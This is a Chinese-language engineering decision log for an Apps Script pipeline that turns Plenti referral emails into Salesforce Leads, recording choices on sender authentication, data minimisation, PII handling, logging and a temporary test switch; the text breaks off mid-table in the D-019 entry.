# 决策记录(DECISIONS)

记录本项目已定决策、跨阶段待办与开放问题。**对话里达成的共识必须落到这里**,
不能只存在于聊天记录中。

规格:[eDocs-Plenti-Intake-开发规格.md](eDocs-Plenti-Intake-开发规格.md)
沙箱配置手册:[SANDBOX_SETUP.md](SANDBOX_SETUP.md)(Jack 手工执行)

## 外部依赖状态(2026-09-07)

| 依赖 | 状态 |
|---|---|
| eDocs 组 **moderation** | ✅ Lily 已确认:不会把邮件扣进审核队列 |
| eDocs 组 **外部发件人能否直接投递** | ⏳ 已再去问 —— 见 **Q12**,直接影响 §5.1 |
| `sf-intake` 账号 | ⏳ 未建。阻塞 Apps Script 项目与触发器 |
| Salesforce 沙箱 | 🔧 Jack 以 `jack.liu` 登录配置中,照 SANDBOX_SETUP.md 走 |
| Plenti 真实样本 | ⏳ 2026-09-09 会议 |

---

## D-001 模板代码原样导入,不在移植时顺手修改

**日期** 2026-09-07 · **决定人** Jack · **阶段** Phase 1

初始 commit(`29846bf`)把 handoff 包的 `Code.gs` / `Tests.gs` /
`test-offline.cjs` **字节级一致**地导入,不做任何修改;第二个 commit 才
`git mv` 到 `src/` 与 `test/` 并加脚手架。

**为什么**:git 会把第二步识别为 rename,`git diff` 在 `src/Code.gs` 上是空的
—— 任何人日后都能一眼确认"移植进来的模板代码一个字没改",不用和 handoff
目录做人工比对。一边搬一边改,就没人能确认到底改了几处。

代价:仓库里会短暂存在模板的硬编码生产值,见 **TODO-1**。Jack 判定可审计
基线比这个代价更重要。

---

## D-002 Phase 1 只搬不改,一行业务逻辑都不动

**日期** 2026-09-07 · **决定人** Jack · **阶段** Phase 1

规格 §2 说的"继承三样东西"(排除规则 / review 兜底 / 创建前防重锁)与
"不要继承购买意图猜测、`extractSender_`"全部属于 Phase 2 / Phase 3。

Phase 1 对代码的**唯一**修改是 `test/offline.cjs` 的一行路径解析:

```
path.join(__dirname, file)  →  path.join(__dirname, '..', 'src', file)
```

有意**没有**顺手做的事:`filename: file` 会让报错栈显示 `Code.gs` 而不是
`src/Code.gs`,可以改得更清楚,但那是无关改动,不碰,免得污染 diff。

---

## D-003 `src/Plenti.gs` 本期只放注释头

**日期** 2026-09-07 · **决定人** Jack · **阶段** Phase 1

该文件出现在规格 §6 的 Phase 1 目录树里,但接口定义属于 Phase 3。本期只放
说明用途的注释头,**不写 `isPlentiSource_` / `parsePlentiReferral_` 的任何
函数签名**,避免跨阶段。

---

## D-004 handoff 包进仓库,冻结保留

**日期** 2026-09-07 · **决定人** Jack · **阶段** Phase 1

`docs/edocs-plenti-handoff/` 原样保留在仓库内。

**为什么**:规格 §2 说的"一次性模板,不是上游依赖"指的是**代码不双向同步**,
不是要求物理删除。留在仓库里可以随时 diff 比对适配改了什么。该包是脱敏版,
不含 Client Secret、Access Token、Script Properties 实际值或客户原始邮件。

---

## D-005 `.gitignore` 屏蔽 `*.eml`;fixture 一律不用 `.eml` 格式

**日期** 2026-09-07 · **决定人** Jack · **阶段** Phase 1

**为什么**:禁止事项 #5。2026-09-09 会议后会拿到 Plenti 真实样本,那时最可能
发生的事故是有人把真实 `.eml` 放进 `test/fixtures/` 当样本 —— 那就是真实客户
融资资料和身份证明进入 git 历史,而 git 历史极难彻底清除。现在挡住成本为零。

**并且**:Phase 3 的 fixture 一律用虚构的 `.txt` 或 `.json`,**即使内容是编的
也不用 `.eml` 格式**。从文件格式上就杜绝"顺手把真实样本存成 fixture"这条
路径。规则同时写在 `test/fixtures/README.md`。

---

## D-006 OAuth scope 按"大概率收不窄"规划

**日期** 2026-09-07 · **决定人** Jack · **阶段** Phase 1

`appsscript.json` 照抄 handoff 示例,含 `https://mail.google.com/`(Gmail
完全权限:读 + 写 + 删),而本项目实际只需要读邮件和加标签。

**Apps Script 的内置 GmailApp 服务就是绑定该 scope 的。** 要收窄基本得改用
Gmail 高级服务直接调 REST API,那是另一套写法、另一次重写。Phase 4 会实测
确认,但**这条按"收不窄"记录,不是一个乐观的待办** —— 不要按"能收窄"规划。

因此缓解措施走流程而非技术:专用账号 `sf-intake` + Workspace 管理员审核授权。

---

## D-007 定位调整:Plenti 是主干,Code.gs 降级为工具库

**日期** 2026-09-07 · **决定人** Jack · **阶段** Phase 2

**本条覆盖规格 §6 对 Phase 2 / Phase 3 的原有描述。** 规格 §6 Phase 3 写的是
"在 `ivProcess_` 之前插入 Plenti 分流",隐含模板 `Code.gs` 是主干。现在反过来:

- 本项目**只处理 Plenti 转介线索**,不处理客户直接询价
- `src/Plenti.gs` 是主干,定时入口直接调 `plProcess_`
- `src/Code.gs` 降级为基础设施工具库(Salesforce REST、属性、状态、标签、
  定时入口与两道安全开关)
- `src/Legacy.gs` 隔离 info 模型专有逻辑

规格原有的 Phase 2(移植三样东西)与 Phase 3(Plenti 骨架)合并执行,
因为在新定位下它们是同一件事。

**为什么**:`Code.gs` 里 info 模型专有的业务逻辑(购买意图猜测、回复补录、
老客户 Account 匹配、已转换 Lead 写 Opportunity)在 eDocs 项目里一条都用不上。
留在主流程里会变成没人敢删又没人看得懂的死代码,而且每一条都是潜在的误触发
路径。

---

## D-008 函数三分类

**日期** 2026-09-07 · **决定人** Jack · **阶段** Phase 2

模板 `Code.gs` 的 32 个函数按下表分流。KEEP 21 个留在 `src/Code.gs`,
DISABLE 11 个原样移入 `src/Legacy.gs`,ADAPT 的部分为 Plenti 重写进
`src/Plenti.gs`(原函数含 DISABLE 片段的整体进 Legacy)。

### KEEP —— 基础设施,留在 Code.gs

`getSalesforceClientCredentialsToken_` · `testSalesforceClientCredentials` ·
`INTAKE_V2`(变量) · `ivAdmin_` · `ivSource_` · `ivRecordUrl_` · `ivReq_` ·
`ivQuote_` · `ivQuery_` · `ivKey_` · `ivGet_` · `ivSave_` · `ivLabel_` ·
`ivLeadFields_` · `ivAttachSource_` · `ivSupplementDescription_` ·
`ivLeadLabelFlags_` · `ivSyncLabels_` · `runIntakeV2` ·
`runSalesforceLeadIntake` · `enableIntakeV2AfterValidation` ·
`ivRefreshOutstanding_`

其中就地修改的四处(全部带 `[Phase 2]` 注释):

| 函数 | 改了什么 | 为什么 |
|---|---|---|
| `INTAKE_V2` | `version` 字符串 | 标识本阶段 |
| `ivAttachSource_` | 加 `ATTACH_RAW_EMAIL` 开关(默认关);标题 `'Info email '` → `'eDocs email '` | 规格 §5.6 / TODO-1 |
| `runIntakeV2` | 检索收窄为 `list:<EDOCS_GROUP_ADDRESS> …`;改调 `plProcess_` / `plRefreshReview_` | 规格 §5.7 / D-007 |
| `ivRefreshOutstanding_` | 改调 `plProcess_` / `plRefreshReview_` | D-007 |

新增三个属性读取器:`ivInternalDomain_` · `ivGroupAddress_` · `ivAttachRawEmail_`。

`ivSupplementDescription_` 在 Phase 2 没有主干消费者(它的消费者
`ivRecordReply_` 是 DISABLE),但 `Tests.gs` 在测它,不算死代码 —— 与 ① 的
判定标准一致。Q6 定了之后更新路径回来会用到它。

### ADAPT —— 逻辑借鉴,为 Plenti 重写

| 原函数 | 借鉴什么 | 丢掉什么 | 新函数(Plenti.gs) |
|---|---|---|---|
| `ivClassify_` 前半段 | 内部 / SF 通知 / Web-to-Lead 失败 / 测试邮件 / 退信 / 自动回复的全部正则 | 后半段购买意图猜测 | `plExclude_` |
| `ivClassify_` 招聘 + 推广 + 语音留言 | 三段正则原样 | —— | `plUntrustedReason_`(只跑在不可信分支) |
| `ivResolve_` | 按客户邮箱查 Lead;`[Intake: msgId]` 判断;有活跃 Lead → review | reply / Opportunity / Account 分支 | `plResolve_` |
| `ivCreateCandidate_` | 标记检查;`IV2_CREATE_` 防重锁 requested→created;创建后回读 | Account 文案、Completed Task、发件人=客户 | `plCreateLead_` + `plLeadPayload_` |
| `ivProcess_` | 状态机骨架:prior 幂等 → 分流 → 写中间态 → 写终态;catch 一律落 error | `extractSender_` / `ivClassify_` / `ivTarget_` / Opportunity | `plProcess_` |
| `ivRefreshReview_` | 调用位置 | `Lead_Category__c` 信号(见 D-011) | `plRefreshReview_`(空操作桩) |

### DISABLE —— 原样移入 Legacy.gs(11 个)

`extractSender_` · `ivTop_` · `ivClassify_` · `ivContactMatch_` ·
`ivResolve_` · `ivExtract_` · `ivCreateCandidate_` · `ivTarget_` ·
`ivRecordReply_` · `ivProcess_` · `ivRefreshReview_`

逐条理由见 `src/Legacy.gs` 文件头。

**`ivTop_` 是计划评审时三分类表遗漏的一个** —— 它在 From/引用边界截断正文,
`PLENTI_ADAPTATION.md` 第 2 条明确警告这会截掉 Plenti 表单资料。它的消费者
(`ivClassify_` / `ivProcess_` / `ivRecordReply_`)全部是 DISABLE,按 ① 的
"无消费者即死代码"标准,它归 Legacy。补记于此。

### 隔离方式

Legacy 函数**保留原名**,不加前缀 —— 改名会破坏与 handoff 原件的 diff 可审计性。
隔离靠两件事:

1. `src/Legacy.gs` 文件头声明
2. **`test/offline.cjs` 的静态守卫**:读取三个文件的源码文本,断言
   `Code.gs` 与 `Plenti.gs` 去掉注释后不出现 Legacy.gs 定义的任何函数名。
   守卫自身有正反向自测(合成用例),并已对真实文件做过反向验证 ——
   往 `Plenti.gs` 注入一个 `ivTop_` 调用,套件确实变红。

另有一道 `test/offline.cjs` 检查:`Legacy.gs` 的每一行都必须按原顺序出现在
`docs/edocs-plenti-handoff/Code.gs` 里,保证它是原文。

---

## D-009 可信判定用严格版 dmarc=pass

**日期** 2026-09-07 · **决定人** Jack · **阶段** Phase 2

`isPlentiSource_` 的判定顺序,任何一步不满足即 `trusted:false`,reason 写明
是哪一步失败:

1. `X-Original-Sender` 头存在且能解析出地址 —— **绝不回退到 `getFrom()`**
2. 该地址命中 `PLENTI_TRUSTED_SENDERS`
3. `X-Original-Authentication-Results` 头存在
4. 该头含 `dmarc=pass`,且若带 `header.from` 则域名与发件人域名一致

第 4 步只认 `dmarc=pass`,**不接受"`spf=pass` 或 `dkim=pass` 其一"**。
DMARC 通过意味着 SPF 或 DKIM 至少一项通过**且域名对齐**;单独的 `spf=pass`
可能只是转发链上某一跳的结果。

**fail-closed 的预期**:若 2026-09-09 样本显示 Plenti 没有 DMARC 记录、或用了
宽松对齐,所有邮件会落到 review —— 可见、不丢失,而且能从 reason 直接看出要调
哪一步。届时会**有意识地放宽并写进本文件**,不是默默改掉。这个预期也写在
`isPlentiSource_` 的函数注释里。

### `PLENTI_TRUSTED_SENDERS` 格式

逗号分隔,每项是完整地址 `user@domain` 或 `@domain`,大小写不敏感,
属性缺失或为空即抛错停止。

**匹配只用相等比较,不用 `indexOf` / `endsWith` 子串匹配** —— 否则
`@plenti.com.au` 会匹配到 `@evil-plenti.com.au`。`@domain` 条目只匹配该域名
本身,**子域名不自动可信**,要用就显式列进属性(放宽只需改配置,不必改代码)。
`testPlentiTrustedSenderBoundary` 用 10 条用例覆盖各种绕过尝试,其中两条是
前缀伪装(`evil-plenti.example`)和后缀伪装(`plenti.example.attacker.example`)。

---

## D-010 推广/招聘正则放在可信验证之后,且只细化 reason

**日期** 2026-09-07 · **决定人** Jack + Claude · **阶段** Phase 2

**位置**:推广、招聘、语音留言三段正则不在 `plExclude_`(阶段 A),而在
`plUntrustedReason_`,只跑在"发件人不可信"分支。

**为什么**:可信 Plenti 转介邮件的页脚极可能带营销话术。推广规则若在可信验证
之前跑,真转介会被判成 promotion 静默丢弃 —— 这是一条真实的漏单路径。放在
不可信分支下,它不可能误杀可信邮件。fixture `trusted-with-promo-footer.json`
就是为这条路径准备的。

**结论强度 —— 这一条与计划书里的括号说明不同,请注意**:计划评审时我写的是
"推广 → promotion 不打标签,和 info 一致;招聘 → review"。实现时改成了
**不可信邮件一律 review,`plUntrustedReason_` 只细化 reason 字符串**,
不再把推广判成静默 ignore。

改的理由有两条:

1. 静默丢弃与规格 §2 第二条可继承原则("认不出来转人工,**绝不静默丢弃**")
   直接冲突
2. Jack 对 Q10 的批复是"按规格实现,不放宽"。规格 §5.1 写的是"验证不通过
   → review",没有例外分支
3. 一封认证失败的**真** Plenti 转介,如果因为页脚营销话术被判 promotion,
   就是一条漏单 —— 而这恰恰是最需要人看的一封

代价是审核噪音更大,那正是 Q10 要用真实流量数据回答的问题。
**这是一处 fail-safe 方向的偏离,改回去只需要动 `plProcess_` 里的一个分支。**

**Jack 已追认(2026-09-07)**:"改得对……你在实现时发现计划书里那个括号不成立
并主动纠正,这个判断优于我的批复。"噪音代价记在 Q10,等流量数据。

---

## D-011 Plenti 不复用 `Lead_Category__c` 作为审核信号

**日期** 2026-09-07 · **决定人** Jack · **阶段** Phase 2

`plLeadPayload_` 的 payload **不写** `Lead_Category__c`。

**为什么**(Jack 的三条理由):

1. **语义不符。** Plenti 转介按定义就是销售线索,模板那套
   "`Other` → `New Sales Enquiry`"映射不到"已审核"这个含义
2. **字段归属。** 这是 Lily 为 info 模型建的字段。两个邮箱往同一字段写不同
   语义,会同时污染两边的报表
3. **报表干净。** `LeadSource='Plenti'` 已经足够区分来源

**连带后果**:模板的 `ivRefreshReview_` 是 review 状态**唯一**的自动解除机制
(管理员改 `Lead_Category__c` → 脚本清 review → Gmail 标签消失)。不复用该字段
意味着 Phase 2 **没有替代方案**:

- `ivRefreshReview_` 进 Legacy
- 新建 `plRefreshReview_` 作为空操作桩:不改任何状态,直接返回。
  这样 `ivRefreshOutstanding_` 改调它之后仍能正常工作
- `SF-Lead-Review` 标签在 Phase 2 需要人工处理

真正的解除信号大概率应该是"Lead 被指派给跟进人",但那阻塞在 **Q1**。
记为 **Q9**。

---

## D-012 Lead Description 不复制邮件正文

**日期** 2026-09-07 · **决定人** Claude(需 Jack 追认) · **阶段** Phase 2

`plLeadPayload_` 的 Description 只写结构化摘要:邮件标记、referral ID、
来源邮箱、主题。**不复制邮件正文。**

**为什么**:模板把客户自由文本正文写进 Description(info 模型下那是全部信息)。
Plenti 转介邮件可能含融资申请资料与身份证明,`PLENTI_ADAPTATION.md` 第 11 条
要求"仅留存销售必要信息,不无条件保存整份融资申请/身份证明"。客户的姓名、
邮箱、电话、地址已经进了 Lead 的原生字段,正文的增量信息主要是敏感部分。

这是数据最小化方向的默认值,与 `ATTACH_RAW_EMAIL=false` 同一个理由。
若审核人反映上下文不够,那是 **Q5** 数据留存范围的一部分,由 Jack 拍板后再放开
—— 改一行即可。

**Jack 已追认(2026-09-07),并追加一条要求:**

> Description 的结构化摘要里**除 `referralId` 外不写任何 Plenti 内部标识符**
> —— application ID、broker ID、客户编号、账户号一律不进。等看到样本、确认
> 哪些字段算"销售必要信息"之后再逐项放开,现在按最小集合写。

当前允许的 Description 行只有六种:邮件标记 `[Intake: …]`、
`PLENTI REFERRAL - PENDING ADMIN REVIEW`、`Source:`、`Plenti referral ID:`、
`Subject:`、以及那句"正文有意不复制"的说明。

**这条不是靠注释维持的。** `testPlentiLeadPayload` 有一道白名单断言:
Description 的每一行都必须命中上述前缀之一。Phase 3 填字段正则时若把解析到
的编号顺手塞进摘要,测试会立刻变红。

---

## D-013 Plenti 数据存储结构:存储与解析解耦

**日期** 2026-09-08 · **决定人** Jack · **阶段** 下一轮实施(本文件记录决策,不是进度)

**背景**:真实邮件格式仍未知(2026-09-09 才拿到样本)。当前解析逻辑基于假设
格式,上线前必然要改。因此把**存储结构**和**解析逻辑**解耦,让格式变化只影响
解析、不影响存储。

### 字段映射

| 字段 | 内容 | 上限 |
|---|---|---|
| `Plenti_Raw_Email__c` | **原始 HTML**(`message.getBody()`),完整不截断 | Long Text Area **131072** |
| `Plenti_Parsed_JSON__c` | 解析结果 `JSON.stringify`;解析不到任何字段时为 `"{}"` | Long Text Area **32768** |
| `Plenti_Received_At__c` | `message.getDate()`,ISO 8601 带时区 | Date/Time |
| `Plenti_Lead_ID__c` | 解析到的 Plenti 唯一 ID;**解析不到则整个字段不传** | Text,External ID + Unique |
| `Description` | 不再写完整原文,改为**一行摘要** | 标准字段 **32000** |

⚠️ **两个上限不一样,不要混。** 131072 是**新建自定义** Long Text Area 的上限;
`Description` 是 Lead 的**标准**字段,上限 32000(规格 §9)。截断阈值按字段分别取。

超长时截断并在末尾标注 `[TRUNCATED]`,**标注算在上限之内**(截到 `上限 - 11`)。

### Description 摘要格式 —— marker 必须保留

```
[Intake: <msgId>] Plenti referral received <ISO8601>; N fields parsed
```

**`[Intake: <msgId>]` 是承重结构,不能删。** 审计(下方"Phase 2 审计记录"问题 2)
表明:POST 路径下,崩溃窗口的恢复**完全依赖** `plResolve_` 按这个标记过滤已建
Lead;§7 验收表"同一封邮件跑两次不重复建"走的也是同一条路径。

任务 B 的 upsert 落地后,PATCH by External ID 天然幂等,这条路径重要性下降 ——
但**只在解析到 `Plenti_Lead_ID__c` 时才走 upsert**,解析不到 ID 的 POST 路径仍
只能靠 marker 恢复。所以标记还不能撤。

### 创建 Lead 的两种模式(任务 B)

抽成一个函数,模式由**是否解析到 Plenti Lead ID** 自动决定:

| 条件 | 调用 |
|---|---|
| 无 ID | `POST /sobjects/Lead` |
| 有 ID | `PATCH /sobjects/Lead/Plenti_Lead_ID__c/{id}` |

两条路径现在都要能跑,**即使 Salesforce 侧的 External ID 字段还没建** —— 先让
代码就位。

⚠️ **PATCH 的响应体形态存疑,不凭记忆写。** 创建时返回 201 带
`{id, created:true}`;更新时不同 API 版本可能是 204 无响应体、也可能是 200 带体。
`ivReq_` 对空 body 返回 `{}` 不会崩,但 `result.id` 会是 `undefined`。

**防御式实现**:拿不到 `id` 时回落到按 `Plenti_Lead_ID__c` 查一次取 Id。
多一次往返,但不依赖记不准的 API 行为。**Phase 4 沙箱实测确认后再决定要不要
去掉这个回落。**

---

## D-014 审计留底存原始 HTML,解析输入用纯文本

**日期** 2026-09-08 · **决定人** Jack · **阶段** 随 D-013 实施

两个用途分开:

| 用途 | 取值 |
|---|---|
| 审计留底 → `Plenti_Raw_Email__c` | **`message.getBody()`**(原始 HTML) |
| 解析输入 → `parsePlentiReferral_` | `message.getPlainBody()` |

**为什么留底不能存转换后的文本**(Jack 的理由,原样记录):

> Gmail 的 HTML→文本转换是有损的,尤其表格布局的邮件,label 和 value 可能被拆到
> 不相邻的位置。如果留底存的是转换后的文本,等于把审计原件变成了一个我们不控制
> 的派生物 —— 将来发现解析漏了字段,原文已经没了。

解析先用 `getPlainBody()` 图省事没问题。样本到了如果发现它丢结构,再换成自己
转换 —— 那时原始 HTML 还在,可以回填历史记录。

⚠️ 与 D-012 的关系:D-012 说的是 **Description 不复制正文**,那条继续有效。
正文现在有了专用的留底字段,受 `Plenti_Raw_Email__c` 的字段级安全控制,
而不是散落在人人可见的 Description 里。数据留存范围本身仍是 **Q5**。

---

## D-015 收件人白名单是范围过滤,不是分类判断

**日期** 2026-09-08 · **决定人** Jack · **阶段** R1,已实现

eDocs 是业务共用邮箱,进来的邮件绝大多数与 Plenti 无关。加一层前置过滤:
只有投递给 `INTAKE_RECIPIENT_ALLOWLIST` 里指定地址的邮件才进 Plenti 处理流程。

### 不命中的邮件直接跳过,不写状态、不打标签

**这不违反规格 §2 "认不出来转人工,绝不静默丢弃"。** 那条针对的是**分类不确定**
时不得丢弃;地址白名单是确定性的边界,与 §5.7 的 `list:` 查询同一性质 ——
`list:` 也把组外邮件全部排除且不留任何记录。

实现位置因此放在 `runIntakeV2` 的循环里(范围过滤),而不是 `plProcess_` 内部
(那会为每封无关邮件写一条 `IV2_MSG_*`,而 Script Properties 有 500KB 上限)。

### 检查哪些头:To / Cc / Delivered-To / X-Original-To,取并集

| 头 | 依据 |
|---|---|
| `To` / `Cc` | 发信人写在信头上的收件人。Groups 转发后 To 通常仍是组地址,多数情况够用。但它**发信人可控**,且 BCC 投递时不出现 |
| `Delivered-To` | 接收方 MTA 实际投递时加的,值是真正的投递信箱。Gmail 会写;Groups 投递给成员的副本通常带 `Delivered-To: <成员地址>` |
| `X-Original-To` | Postfix 系约定。Gmail 一般**不**写,列上是兜底,成本为零 |

⚠️ **我对 Google Groups 实际写哪个头没有百分百把握。** 取并集是为了实测不会因为
猜错头而一封都进不来。代价是范围偏宽(例如只是被 Cc 也放行)。
**实测拿到真实邮件后应收窄到实际存在的那个头。**

### 属性缺失即抛错停止

与 `EDOCS_GROUP_ADDRESS`、`INTERNAL_DOMAIN` 一致(规格 §3 禁止 #2)。
理由:**一个本意为"收窄范围"的开关,缺失时不能反而变成最宽,而且不能是静默的。**

匹配复用 D-009 的域名边界规则(只用相等比较,子域名不自动命中)。
`plSenderTrusted_` 与 `plRecipientAllowed_` 共用 `plAddressMatches_` 核心,
但保留各自的函数名 —— 语义不同,一个是"谁发的可信",一个是"投给谁才处理"。

### 一处取舍:整条 thread 都不在范围内就不同步标签

共用邮箱里这类 thread 占多数,每条省下 3 次 Gmail API 调用,避免 220 秒预算被
无关邮件吃掉。**代价**:若日后把某地址移出白名单,那些 thread 的旧标签不会被
自动清除,需人工处理。

---

## D-016 每轮执行追加一行到 Google Sheet

**日期** 2026-09-08 · **决定人** Jack · **阶段** R2,已实现

`ivLogRun_` 在 `runIntakeV2` 末尾追加一行。用途有两个:Apps Script 的执行日志
保留期短,这是长期留底;将来跟 Plenti 做月度对账也用这张表。

列(按 Jack 指定的顺序):

```
Run at | Threads scanned | Messages processed | Leads created | Failures | Error summary | Duration (s)
```

空表会先写一行表头。

### 两条失败策略

| 情况 | 行为 | 理由 |
|---|---|---|
| `INTAKE_LOG_SHEET_ID` 未配置 | 直接跳过,**不报错** | 这是可选的观测手段,没配不等于配置错误 |
| 写入失败(ID 错 / 无权限 / 表被删) | 记 `console.log` 后**继续** | 到这一步邮件已处理完、状态已落盘。再抛错会把整轮落成失败,冻结 watermark 并触发 L-01 那条渐进劣化路径 —— **代价远大于丢一行日志** |

⚠️ **需要新 OAuth scope**:`appsscript.json` 已加
`https://www.googleapis.com/auth/spreadsheets`。**加了 scope 意味着现有授权失效,
Apps Script 会要求重新授权。** 部署时注意。

### 一处未采纳

`stats.skipped`(被白名单跳过的邮件数)对调白名单很有用,但不在 Jack 指定的
七列里,**没有加进表**以免改动列结构。它出现在 `console.log` 的
`skippedOutOfScope` 字段里。要进表随时可加。

---

## D-017 ⚠️ 临时强制创建开关 —— Phase 4 结束后必须删除

**日期** 2026-09-08 · **决定人** Jack · **阶段** R3,已实现 · **状态:🔴 临时代码**

### 为什么需要

解析骨架恒返回 `unknown/low`,`plCreateLead_` 在正常路径上执行不到,于是
**"真正写 Lead"这一跳是整条链里唯一没被任何代码验证过的**。昨天沙箱建 Lead
成功走的是已废弃的 Apex 路线,与 `plCreateLead_` 无关。

`PLENTI_FORCE_CREATE` 设为字符串 `'true'` 时绕过置信度判定直接走创建路径。
未配置 = 关闭(与 `ATTACH_RAW_EMAIL` 同样刻意不抛错 —— 默认关闭才是安全方向)。

### 加在哪一层

要绕过的是**两道**门,不是一道:

1. `plProcess_` 的置信度判定
2. `plResolve_` 里的 `plFindReferral_` —— 那是必抛错的 fail-closed 桩,
   不绕过照样到不了 `plCreateLead_`

**开关只在 `plForceCreate_()` 一个函数里读**,两个调用点各是一个单行 guard,
正常判定逻辑一行未改。

**`parsePlentiReferral_` 保持诚实** —— 照旧返回 `unknown/low`,不让解析器谎报
自己解析成功。有断言锁住这一点。

### 保留了什么

| 层 | 强制模式下 |
|---|---|
| 第 1 层 邮件级 marker 去重 | ✅ 保留 —— 同一封邮件跑两次不会建两个 Lead |
| 第 2 层 业务级 referral ID | ⏭️ 跳过 —— 存储未实现,且强制模式的 ID 是 `FORCED-<msgId>`,与消息一一对应,第 1 层已按消息 ID 挡过一次,这一层在此模式下本就冗余 |
| 第 3 层 跨邮箱活跃 Lead 检查 | ✅ 保留 |
| `IV2_CREATE_` 防重锁 | ✅ 保留 |

### 合成值的两条安全约束

`plForcedParse_` **保留所有真实解析到的值,只填空缺**(Phase 3 填了正则之后仍
适用)。合成的两个值:

- `referralId` = `FORCED-<msgId>` —— 与消息一一对应,重跑不变,一眼看得出是测试数据
- `email` = `forced-<msgId>@example.invalid` —— ⚠️ **`.invalid` 是 RFC 2606 保留的
  不可路由 TLD。这一条是防止 Salesforce 的自动回复 Flow 真的把邮件发给某个真实
  地址。** 绝不拿发件人地址兜底 —— 那正是规格 §5.2 禁止的事。

### 可见性:三个地方都喊

1. `console.log` 每轮开头:`⚠️⚠️ PLENTI_FORCE_CREATE is ENABLED …`
2. 每轮 summary JSON 里 `forceCreate:true`
3. **Sheet 的错误摘要列前缀 `[PLENTI_FORCE_CREATE ENABLED]`** —— 几个月后翻这张
   表必须一眼看得出哪几轮是绕过判定写进去的。不新增列,用唯一的自由文本列。

另有一条**只告警不拦截**的检查:开关打开但 `SF_LOGIN_URL` 不像沙箱域名时打一条
更醒目的日志。不拦截是因为沙箱域名形态不是本项目能担保的判据,拦错了会挡住正常
验收 —— 但这一层可以在上线前收紧成硬拦截。

### 🔴 删除清单(Phase 4 验收结束后执行)

```bash
grep -rn "R3 临时\|D-017\|PLENTI_FORCE_CREATE\|plForceCreate_\|plForcedParse_" src/
```

逐项:

| 文件 | 删什么 |
|---|---|
| `src/Plenti.gs` | 整节 "R3 临时强制创建开关"(`plForceCreate_` + `plForcedParse_`);`plResolve_` 的 `forced` 参数与那个三元;`plProcess_` 的 `if(!plForceCreate_())` 分支,恢复成直接 return;终态 reason 的 `[FORCED]` 前缀;文件头流程图那一行 |
| `src/Code.gs` | `stats.forced` 及两条告警;summary JSON 的 `forceCreate`;`ivLogRun_` 的 `[PLENTI_FORCE_CREATE ENABLED]` 前缀;文件头注释那一行 |
| `src/PlentiTests.gs` | 整个 `testPlentiForceCreate` 及入口里的调用 |
| Script Properties | 删掉 `PLENTI_FORCE_CREATE` 键本身 |

删完 `node test/offline.cjs` 应回到 31 项全绿。

---

## L-03 Sheet 错误摘要现在带消息 ID

**日期** 2026-09-08

L-01 触发后要人工删除的键是 `IV2_CREATE_<Gmail 消息 ID>`。原先该 ID 只出现在
`console.log`(`Plenti intake error <id>: <reason>`),而 Apps Script 日志保留期短 ——
Sheet 才是长期留底,却不带 ID,事后无从下手。

现在 `stats.errors` 的每一条是 `<消息 ID>: <原因>`。这是在既有列里加内容,
没有改列结构。

---

## D-018 消息级日志:先把原料完整拿到手,不加工

**日期** 2026-09-08 · **决定人** Jack · **阶段** R7,已实现

R2 是每轮一行汇总,排查不了单封邮件。真实 lead 明天就会进来,而且**没有邮件
模板** —— 接下来几天调正则的主要依据,就是能从表里直接看到每封邮件的原文和它
被解析成了什么。

在同一个 Sheet 新增 `Messages` 标签页,与汇总页并存,12 列:
处理时间 / 邮件时间 / Gmail 消息 ID / 发件人 / 收件人 / 主题 / 最终状态 /
解析置信度 / 解析结果 JSON / SF Lead ID / 备注与错误 / 邮件正文。

### 这一轮**不做**任何正文清洗

`plCleanBody_(text,isHtml)` 是**纯透传占位**,函数体只有一行 `return text`。
有断言锁死这一点。

**为什么现在不写**(Jack 的理由):Plenti 的邮件格式 2026-09-09 才第一次见到,
此刻写的任何 HTML 标签过滤或文本清洗规则都是猜的,大概率要推翻。而且
`getPlainBody()` 返回的已经是 Gmail 转好的纯文本,**可能本身就够用** ——
也可能表格结构被拍扁导致 label 和 value 对不上。只有看到真实邮件才判断得了。

**这一轮的目标是把原料完整拿到手,不是加工它。** 回落到 HTML 时标签原样保留,
不剥。将来的清洗逻辑就插在 `plCleanBody_` 里,调用点不用动。

### 正文取哪个 —— 与 D-014 不冲突

| 用途 | 取值 |
|---|---|
| **Sheet 排查工具** | `getPlainBody()`,为空时回落 `getBody()` 并标注 |
| **Salesforce 审计留底** `Plenti_Raw_Email__c` | `getBody()` 原始 HTML(D-014) |

两者用途不同,取值可以不同。Sheet 是排查工具,纯文本更省空间、调正则更直观;
`Plenti_Raw_Email__c` 才是不可有损的审计原件。

### 三个约束

1. **单元格上限**:Google Sheets 单格上限 50,000 字符,**超长会导致整行写入
   失败,不只是那一格**。截到 `IV_SHEET_CELL_LIMIT = 45000`(含 `[TRUNCATED]`
   标记本身),留足余量。截断同时在备注列标注 `[BODY TRUNCATED from N chars]`。
2. **批量写入**:一轮多封邮件用一次 `setValues`,不逐行 `appendRow`。
3. **失败不影响主流程**:与 D-016 同一策略 —— 未配置就跳过,写入失败就记
   `console.log` 继续。有断言验证写入失败后消息状态仍然保留。

### 白名单外的邮件不写进 Messages 页

eDocs 是业务共用邮箱,这类邮件占多数。全记会把表撑爆,**而且我们没有理由留存
那些邮件的内容**。过滤发生在 `runIntakeV2` 循环里,与 D-015 同一位置。

### 两个实现细节

- **`Messages` 页显式插在最后一个位置**(`insertSheet(name, getNumSheets())`)。
  `ivLogRun_` 写的是 `getSheets()[0]`,新页若插到最前面会让汇总日志静默写错
  标签页。有断言锁住插入位置。
- **解析结果走 `plProcess_` 的 `detail` 出参,不进 `state`。**
  `state` 会被 `ivSave_` 序列化进 Script Properties,而解析 JSON 放进去会撑爆
  500KB 上限。有断言验证落盘的 state 里没有 `parsed`。

### ⚠️ 这张表含 PII

`Messages` 页会包含真实客户的姓名、邮箱、电话、安装地址和邮件原文。
**分享设置必须限制为逐个指定的人员,绝不可设为「知道链接的人可查看」。**
已写进 README 和 SANDBOX_SETUP 第 9 节。Sheet ID 本身不入仓库。

这张表是排查工具,**不是长期客户数据仓库**。解析规则稳定后应评估保留期与清理
策略 —— 与 **Q5** 是同一个问题。

---

## D-019 数据源反转:客户数据在 browser view 页面,不在邮件正文

**日期** 2026-09-09 · **决定人** Jack · **阶段** R8,已实现

### 事实

Plenti 邮件正文的客户字段是**空的**。Lily 直接收到的原件也一样 —— 不是转发
导致的。Plenti 是上市金融机构,让他们改邮件模板不现实,**我们只能自适应**。

**邮件正文的作用只剩两个:触发处理,以及提供 View in Browser 链接。**

Jack 用真实浏览器实测该页面,我用本地 curl 复核,两边一致:

| 项 | 结果 |
|---|---|
| HTTP | 200,0 次重定向 |
